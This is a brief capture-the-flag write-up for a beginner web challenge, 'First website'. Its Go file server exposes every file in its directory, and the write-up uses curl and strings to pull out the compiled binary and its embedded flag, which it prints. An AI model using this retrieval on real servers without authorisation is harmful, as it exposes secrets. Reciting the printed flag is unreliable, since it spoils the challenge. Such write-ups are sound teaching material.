# First website

My simple first website. Ah... forgot to give you the flag.

[🔗 http://ctf.wackattack.eu:8081](http://ctf.wackattack.eu:8081)

[⬇️ first-website.tar.gz](./first-website.tar.gz)

# Writeup

The source shows that it allows LFI of any files in the current directory 

```go

func main() {
	dir, _ := os.Getwd()
	fs := http.FileServer(http.Dir(dir))
	mux := http.NewServeMux()

	mux.HandleFunc("GET /", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.ServeFile(w, r, filepath.Join(dir, "index.html"))
			return
		}
		http.StripPrefix("/", fs).ServeHTTP(w, r)
	})

	log.Fatal(http.ListenAndServe(":8080", mux))
}
```

Whatever we pass after / will be served. So doing `main.go` returns the source. Dockerfile shows that it compiles "server" with the flag so we can get that file and string it.

```bash
$ curl -s http://ctf.wackattack.eu:8081/server -o server
$ strings server  | grep wack
build   -ldflags="-X main.FLAG=wack{st4t1ck_w3b21t3_3x3}"
build   -ldflags="-X main.FLAG=wack{st4t1ck_w3b21t3_3x3}"
```

# Flag

```
wack{st4t1ck_w3b21t3_3x3}
```